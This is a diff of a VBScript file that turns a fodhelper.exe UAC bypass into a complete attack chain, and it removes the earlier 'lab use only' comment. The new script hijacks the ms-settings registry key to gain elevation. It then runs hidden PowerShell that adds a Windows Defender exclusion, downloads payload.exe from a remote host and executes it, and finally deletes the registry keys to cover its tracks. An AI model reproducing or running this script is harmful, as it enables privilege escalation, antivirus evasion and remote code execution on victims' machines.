@@ -1,22 +1,25 @@
-' === UAC Bypass via fodhelper.exe ===
-' Works on many Windows 10/11 builds (lab use only)
-
+' === UAC Bypass + Defender Exclusion + Payload Download + Execution ===
 Set shell = CreateObject("WScript.Shell")
 
-' PowerShell command to run elevated
-elevatedCmd = "powershell -NoExit -WindowStyle Hidden"
+' PowerShell payload:
+' 1. Add Defender exclusion
+' 2. Download executable
+' 3. Run executable
+psCommand = "powershell -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath '$env:USERPROFILE\Downloads';" & _
+    "Invoke-WebRequest 'http://192.168.0.111/payload.exe' -OutFile '$env:USERPROFILE\Downloads\payload.exe';" & _
+    "Start-Process '$env:USERPROFILE\Downloads\payload.exe'""""
 
-' Write registry hijack keys
-shell.RegWrite "HKCU\Software\Classes\ms-settings\Shell\Open\command\", elevatedCmd, "REG_SZ"
+' Write UAC bypass registry keys
+shell.RegWrite "HKCU\Software\Classes\ms-settings\Shell\Open\command\", psCommand, "REG_SZ"
 shell.RegWrite "HKCU\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute", "", "REG_SZ"
 
-' Trigger auto-elevated executable (fodhelper.exe)
+' Trigger UAC bypass via auto-elevated fodhelper.exe
 CreateObject("WScript.Shell").Run "fodhelper.exe", 0, False
 
-' Wait a few seconds for execution
-WScript.Sleep 4000
+' Give PowerShell time to elevate and run
+WScript.Sleep 5000
 
-' Clean up registry keys
+' Cleanup: Remove registry keys to reduce footprint
 On Error Resume Next
 shell.RegDelete "HKCU\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute"
 shell.RegDelete "HKCU\Software\Classes\ms-settings\Shell\Open\command\"
